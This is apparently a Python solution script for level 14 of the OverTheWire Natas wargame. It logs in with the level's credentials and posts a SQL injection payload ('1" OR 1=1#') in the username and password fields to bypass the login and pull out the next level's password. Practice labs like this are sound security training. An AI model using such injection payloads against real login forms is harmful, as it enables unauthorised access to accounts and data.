import re
import requests

level = 14
creds = ('natas14','Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

#print(data)
formdata = {'username':'1" OR 1=1#','password':'1" OR 1=1#','submit':'Login'}

response = session.post(url,auth=creds,data=formdata)

data = response.text

print(re.findall('Successful login! The password for natas15 is (.*)<br>',data))